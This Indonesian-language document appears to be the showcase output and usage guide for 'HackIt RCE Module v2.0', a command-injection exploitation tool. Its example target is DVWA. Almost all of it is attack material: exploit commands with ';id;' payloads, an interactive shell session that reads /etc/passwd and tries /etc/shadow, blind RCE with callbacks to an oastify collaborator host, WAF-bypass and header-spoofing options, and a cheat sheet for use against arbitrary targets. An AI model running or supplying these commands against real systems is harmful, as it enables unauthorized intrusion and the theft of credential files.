=========================================================================
   CONTOH HASIL RCE BERHASIL — HACKIT RCE MODULE v2.0
=========================================================================

                  ╔═══════════════════════╗
                  ║  RCE CONFIRMED!  ⚠   ║
                  ╚═══════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 1. DETECTION MODE — Menemukan celah RCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Skenario: Target VulnHub / DVWA / aplikasi web rentan

$ ./rce.sh -u "http://192.168.1.100/dvwa/vulnerabilities/exec/?cmd=test" --cookie "PHPSESSID=abc123;security=low"

╔══════════════════════════════════════════════════════════════╗
║██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗████████╗                ║
║██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║╚══██╔══╝                ║
║███████║███████║██║     █████╔╝ ██║   ██║                   ║
║██╔══██║██╔══██║██║     ██╔═██╗ ██║   ██║                   ║
║██║  ██║██║  ██║╚██████╗██║  ██╗██║   ██║                   ║
║╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝                   ║
║  ██████╗ ██████╗ ███████╗     ███╗   ███╗ ██████╗ ██████╗ ██╗   ║
║ ██╔════╝██╔═══██╗██╔════╝     ████╗ ████║██╔═══██╗██╔══██╗██║   ║
║ ██║     ██║   ██║█████╗       ██╔████╔██║██║   ██║██║  ██║██║   ║
║ ██║     ██║   ██║██╔══╝       ██║╚██╔╝██║██║   ██║██║  ██║██║   ║
║ ╚██████╗╚██████╔╝███████╗     ██║ ╚═╝ ██║╚██████╔╝██████╔╝██║   ║
║  ╚═════╝ ╚═════╝ ╚══════╝     ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═╝   ║
╠══════════════════════════════════════════════════════════════╣
║  RCE MODULE v2.0 — Multi-Engine RCE Detection & Exploitation  ║
╠══════════════════════════════════════════════════════════════╣
║  ✓ Go      ✓  C 8 wrappers · 7 techniques · OOB · Shell       ║
║  ✓ Rust    ✓  C Async · Regex detection · Concurrent · Shell   ║
║  ✓ C++     ✓  C Thread pool · WAF bypass · Shell · Tech-sp.   ║
║  ✓ C       ✓  C Raw sockets · OOB · Blind · Shell              ║
╠══════════════════════════════════════════════════════════════╣
║  Techniques: Output-Based | Time-Based | Error-Based | Blind|OOB║
║             WAF Bypass | Regex Detection | Tech-Specific        ║
╠══════════════════════════════════════════════════════════════╣
║  Interactive Shell • JSON Output • Multi-Threading              ║
║  Proxy Support • Cookie/Header Injection • Retry/Delay          ║
╚══════════════════════════════════════════════════════════════╝

[*] Running go engine...
[*] Running rust engine...
[*] Running cpp engine...
[*] Running c engine...

══════════════════════ RCE RESULTS ══════════════════════

  [!] Engine: Go     | Param: cmd | Tech: output-based  | Conf: 95%
  [!] Engine: Rust   | Param: cmd | Tech: output-waf    | Conf: 93%
  [!] Engine: C++    | Param: cmd | Tech: output-based  | Conf: 95%
  [!] Engine: C      | Param: cmd | Tech: output-based  | Conf: 95%

╔══════════════════════════════════════════════════════╗
║           ⚠  RCE VULNERABILITY DETECTED  ⚠          ║
╚══════════════════════════════════════════════════════╝
[!] RCE CONFIRMED — 4 vulnerability(ies) found


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 2. EXPLOIT MODE — Eksekusi command
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$ ./rce.sh -u "http://192.168.1.100/dvwa/vulnerabilities/exec/?cmd=test" -c "id && whoami && uname -a"

[*] Running go engine...
[*] Running rust engine...
[*] Running cpp engine...
[*] Running c engine...

══════════════════════ RCE RESULTS ══════════════════════

  [!] Engine: Go     | Param: cmd | Tech: exploit | Conf: 100%
  [!] Engine: Rust   | Param: cmd | Tech: exploit | Conf: 100%
  [!] Engine: C++    | Param: cmd | Tech: exploit | Conf: 100%
  [!] Engine: C      | Param: cmd | Tech: exploit | Conf: 100%

  ╔══════════════════════════════════════════════════════╗
  ║              COMMAND EXECUTION RESULT                ║
  ╠══════════════════════════════════════════════════════╣
  ║                                                      ║
  ║  uid=33(www-data) gid=33(www-data) groups=33(www-data)║
  ║  www-data                                            ║
  ║  Linux dvwa 5.10.0-kali-amd64 #1 SMP Debian x86_64  ║
  ║                                                      ║
  ╚══════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════╗
║           ⚠  RCE VULNERABILITY DETECTED  ⚠          ║
╚══════════════════════════════════════════════════════╝


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 3. SHELL MODE — Interactive reverse shell via RCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$ ./rce.sh -u "http://192.168.1.100/dvwa/vulnerabilities/exec/?cmd=test" --shell

[*] Running go engine...
[+] RCE SHELL ACTIVE — type 'exit' to quit
[+] Target: http://192.168.1.100/dvwa/vulnerabilities/exec/?cmd=test
[+] Parameters: [cmd]

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ ls -la /etc/passwd
-rw-r--r-- 1 root root 2345 Jan 15  2024 /etc/passwd

$ cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash

$ uname -a
Linux dvwa 5.10.0-kali-amd64 #1 SMP Debian 5.10.40-1 (2021-06-10) x86_64 GNU/Linux

$ pwd
/var/www/html/vulnerabilities/exec/

$ ls -la
total 12
drwxr-xr-x 2 www-data www-data 4096 Jan 15  2024 .
drwxr-xr-x 3 www-data www-data 4096 Jan 15  2024 ..
-rw-r--r-- 1 www-data www-data  892 Jan 15  2024 source.php

$ cat /etc/shadow 2>/dev/null || echo "permission denied"
permission denied

$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ exit
[!] Shell closed


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 4. JSON OUTPUT — Untuk parsing / automation
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$ ./rce.sh -u "http://192.168.1.100/dvwa/vulnerabilities/exec/?cmd=test" -c "id" --json 2>/dev/null

[
  {
    "vulnerable": true,
    "url": "http://192.168.1.100/dvwa/vulnerabilities/exec/?cmd=test",
    "parameter": "cmd",
    "method": "GET",
    "payload": ";id;",
    "command": "id",
    "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
    "confidence": 1.0,
    "engine": "go",
    "technique": "exploit"
  },
  {
    "vulnerable": true,
    "url": "http://192.168.1.100/dvwa/vulnerabilities/exec/?cmd=test",
    "parameter": "cmd",
    "method": "GET",
    "payload": ";id;",
    "command": "id",
    "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
    "confidence": 1.0,
    "engine": "rust",
    "technique": "exploit"
  }
]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 5. OOB (OUT-OF-BAND) — Blind RCE dengan callback
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$ ./rce.sh -u "http://target.com/page?url=test" --oob "http://collaborator.oastify.com"

Output di Burp Collaborator:
  HTTP Request: GET /YmFzZTY0X2VuY29kZWRfaWQ=
  DNS Lookup:  www-data.xxx.oastify.com
  → Blind RCE TERBUKTI via OOB callback!


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 6. PYTHON INTEGRATION — Dalam script automated
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

from rce_modul import scan_rce, display_results

# Auto detect + exploit
results = scan_rce(
    url="http://192.168.1.100/dvwa/vulnerabilities/exec/?cmd=test",
    cmd="cat /etc/passwd",
    cookie="PHPSESSID=abc123;security=low",
    engines="go,rust",
    exploit=True
)

display_results(results)

# Output:
# ╔══════════════════════════════════════════════════════╗
# ║              COMMAND EXECUTION RESULT                ║
# ╠══════════════════════════════════════════════════════╣
# ║  root:x:0:0:root:/root:/bin/bash                     ║
# ║  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin     ║
# ║  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin║
# ║  ...                                                 ║
# ╚══════════════════════════════════════════════════════╝


=========================================================================
  7. CHEAT SHEET — Command cepat
=========================================================================

┌─────────────────────────────────────────────────────────────────────┐
│ TUJUAN                     │ COMMAND                                │
├─────────────────────────────────────────────────────────────────────┤
│ Deteksi basic              │ ./rce.sh -u "http://target?q=test"    │
│ Exploit id                 │ ./rce.sh -u "http://target?q=test" -c "id" │
│ Shell interaktif           │ ./rce.sh -u "http://target?q=test" --shell │
│ Blind + OOB                │ ./rce.sh -u "http://target?q=test" --blind --oob "http://x.oastify.com" │
│ WAF bypass                 │ ./rce.sh -u "http://target?q=test" --tech php │
│ POST + proxy               │ ./rce.sh -u "http://target/api" -d "input=x" -m POST --proxy "http://127.0.0.1:8080" │
│ JSON output                │ ./rce.sh -u "http://target?q=test" -c "id" --json │
│ Engine tunggal (Rust)      │ ./rce.sh -u "http://target?q=test" -e rust │
│ Custom header + delay      │ ./rce.sh -u "http://target?q=test" --header "X-Forwarded-For: 127.0.0.1" --delay 500 │
│ All params brute           │ ./rce.sh -u "http://target" --all     │
│ Python integration         │ from rce_modul import scan_rce        │
└─────────────────────────────────────────────────────────────────────┘
